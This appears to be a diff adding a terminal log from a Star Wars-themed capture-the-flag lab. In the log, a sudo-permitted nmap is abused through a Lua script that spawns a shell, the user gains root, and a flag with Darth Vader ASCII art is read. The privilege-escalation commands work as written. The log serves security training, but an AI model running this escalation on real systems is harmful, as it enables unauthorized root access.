@@ -1,0 +1,52 @@
+Matching Defaults entries for Darth on starwars:                            
+    env_reset, mail_badpass,                                                
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+                                                                            
+User Darth may run the following commands on starwars:
+    (ALL) NOPASSWD: /usr/bin/nmap
+Darth@starwars:~$ 
+
+Darth@starwars:~$ TF=$(mktemp)
+TF=$(mktemp)
+Darth@starwars:~$ echo 'os.execute("/bin/sh")' > $TF
+echo 'os.execute("/bin/sh")' > $TF
+Darth@starwars:~$ sudo /usr/bin/nmap --script=$TF
+sudo /usr/bin/nmap --script=$TF
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-07 10:30 EST
+NSE: Warning: Loading '/tmp/tmp.ByCAQbccuN' -- the recommended file extension is '.nse'.
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+Desktop    Downloads  Music                Pictures  Templates
+Documents  flag.txt   nmap-4.53.tar.bz2.2  Public    Videos
+# 
+# 
+# cat flag.txt
+    .-.
+                      |_:_|
+                     /(_Y_)\
+.                   ( \/M\/ )
+ '.               _.'-/'-'\-'._
+   ':           _/.--'[[[[]'--.\_
+     ':        /_'  : |::"| :  '.\
+       ':     //   ./ |oUU| \.'  :\
+         ':  _:'..' \_|___|_/ :   :|
+           ':.  .'  |_[___]_|  :.':\
+            [::\ |  :  | |  :   ; : \
+             '-'   \/'.| |.' \  .;.' |
+             |\_    \  '-'   :       |
+             |  \    \ .:    :   |   |
+             |   \    | '.   :    \  |
+             /       \   :. .;       |
+            /     |   |  :__/     :  \\
+           |  |   |    \:   | \   |   ||
+          /    \  : :  |:   /  |__|   /|
+      snd |     : : :_/_|  /'._\  '--|_\
+          /___.-/_|-'   \  \
+                         '-'
+
+I hope you liked it Padawan :)  # 
+# 
+# 
+
